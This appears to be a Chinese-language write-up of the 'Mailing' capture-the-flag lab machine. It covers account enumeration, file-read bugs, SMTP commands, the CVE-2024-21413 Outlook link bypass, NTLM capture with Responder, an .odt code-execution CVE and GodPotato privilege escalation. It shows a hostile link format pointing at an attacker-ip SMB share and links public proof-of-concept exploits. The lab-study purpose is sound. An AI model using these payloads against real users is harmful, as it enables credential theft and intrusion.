---
title: Mailing
description: 
tags:
  - OSINT
  - AFR
  - smtp
  - CVE-2024-21413
  - Responder
date: 2026-05-07
---

## OSINT

發現網頁中可以下載 mail 的教學文件，透過文件，我們可以發現 maya@mailing.htb、ruy@mailing.htb 及 gregory@mailing.htb 三個帳號。

## AFR(任意檔案讀取)

- LFI (Local File Inclusion, 本地檔案包含)：
    後端使用 `include($_GET['file'])`，PHP 會把讀進來的檔案當作程式碼交給直譯器執行。
- AFR (Arbitrary File Read, 任意檔案讀取)：
    後端使用 `file_get_contents($_GET['file'])` 或是 `readfile($_GET['file'])`，PHP 會把讀進來的檔案當作純文字回傳給使用者。

## smtp

常見 port `25`: 無加密、`465`: SSL/TLS 加密、`587`: STARTTLS 加密(先明文連線再加密)。
連線方法:

```bash
telnet mailing.htb 25
openssl s_client -connect mailing.htb:465
openssl s_client -starttls smtp -connect mailing.htb:587
nc -C -nv mailing.htb 25
```

連線後可以使用 SMTP 指令：

- `HELO`：打招呼，告訴對方你的身份。
- `MAIL FROM`：指定寄件者的 email 地址。
- `RCPT TO`：指定收件者的 email 地址。
- `DATA`：開始傳送郵件內容。
- `QUIT`：結束連線。
- `VRFY`：驗證 email 地址是否存在。
- `AUTH LOGIN`：使用者登入 SMTP 伺服器。

寄信的範例：

```bash
HELO mailing.htb
MAIL FROM: <service@mailing.htb>
RCPT TO: <ruy@mailing.htb>
DATA
Subject: Test Email

This is a test email.
.
QUIT
```

登入的範例：

```bash
> AUTH LOGIN
334 VXNlcm5hbWU6
> dXJ5QG1haWxpbmcodGg=      // base64 編碼的 email 地址
334 UGFzc3dvcmQ6
> cGFzc3dvcmQxMjM=          // base64 編碼的密碼
235 Authentication successful
```

## CVE-2024-21413

在正常的 Outlook 中，如果信件內包含指向外部網路磁碟機（SMB share）的連結（例如 file:///\\192.168.1.100\share），當使用者點擊時，Outlook 會跳出嚴格的安全性警告，阻止自動連線。
然而，CVE-2024-21413 的漏洞允許攻擊者繞過這些安全性警告。只要在連結的特定位置加上一個驚嘆號 !（例如 file:///\\192.168.1.100\share!test），Outlook 就會誤認為這是一個安全的連結，直接嘗試連線到攻擊者控制的 SMB 伺服器。攻擊者可以利用這個漏洞來竊取使用者的 NTLM 認證資訊，進而對內部網路發動進一步的攻擊。

POC [傳送門](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

## Responder

Responder 是一個用來捕獲 NTLM 認證資訊的工具，當攻擊者在內部網路中設置 Responder 並等待受害者點擊特製的連結（例如 file:///\\attacker-ip\share!test）時，Responder 就會捕獲到受害者的 NTLM 認證資訊，這些資訊可以用來進行後續的攻擊，例如 Pass-the-Hash 或是離線破解密碼。

## CVE-2023-2255

這東西也是需要使用者觸發。使用者可以在 .odt 文件中插入程式碼，當使用者打開這個文件時，程式碼就會被執行，例如建立一個 reverse shell 連線到攻擊者的伺服器。

POC [傳送門](https://github.com/elweth-sec/CVE-2023-2255.git)

## God Potato

題外話，如果低權限帳號具有 SeImpersonatePrivilege 權限，攻擊者可以利用這個權限來`模擬`高階使用者，進而提升權限。他的做法是在本地建立一個假的 RPC 伺服器，並誘使高階使用者連線到這個伺服器，當高階使用者連線時，攻擊者就可以捕獲到他的 NTLM 認證資訊，並利用這些資訊來模擬高階使用者的身份，進行後續的攻擊。